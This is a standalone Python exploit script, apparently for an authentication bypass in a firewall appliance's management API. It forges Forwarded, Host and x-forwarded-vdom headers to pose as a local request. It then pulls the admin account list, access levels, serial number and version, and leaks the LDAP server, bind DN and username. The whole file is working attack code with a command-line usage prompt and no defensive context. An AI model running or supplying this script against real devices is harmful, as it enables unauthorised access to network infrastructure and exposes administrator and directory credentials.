#!/usr/bin/env python3
import requests
import sys
import urllib3
import json 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(target):

    if target[-1] == "/":
        target = target[:-1]
        
    print("Exploiting target: {}".format(target))
    headers = {
        "user-agent": "Node.js",
        "accept-encoding": "gzip, deflate",
        "Host": "127.0.0.1:9980",
        "forwarded": 'by="[127.0.0.1]:80";for="[127.0.0.1]:49490";proto=http;host=',
        "x-forwarded-vdom": "root",
    }

    r = requests.get(target + "/api/v2/cmdb/system/admin", headers=headers, verify=False)
    if(r.status_code == 200):
        
        print("\033[92m[+] The target {} is vulnerable\033[0m".format(target))
        data = json.loads(r.text)
        for user in data['results']:
            print("\033[93m[+]\033[0m Admin username: {}".format(user['name']))
            print("\033[93m[+]\033[0m Level access: {}".format(user['accprofile']))
        print("[+] Serial: {}".format(data['serial']))
        print("[+] Version: {}".format(data['version']))

        r = requests.get(target + "/api/v2/cmdb/user/ldap", headers=headers, verify=False)
        data = json.loads(r.text)
        if(len(data['results']) > 0):
            print("[+] Leaking ldap config")
            print("\033[93m[+]\033[0m LDAP server: {}".format(data['results'][0]['name']))
            print("\033[93m[+]\033[0m LDAP server: {}".format(data['results'][0]['server']))
            print("\033[93m[+]\033[0m LDAP binddn: {}".format(data['results'][0]['dn']))
            print("\033[93m[+]\033[0m LDAP username: {}".format(data['results'][0]['username']))

    else:
        print("[-] The target is not vulnerable")    

def main():
    if len(sys.argv) != 2:
        print("Usage: exploit.py <target>")
        print("Example: exploit.py https://target:8443")
        sys.exit(1)
    target = sys.argv[1]
    exploit(target)

if __name__ == "__main__":
    main()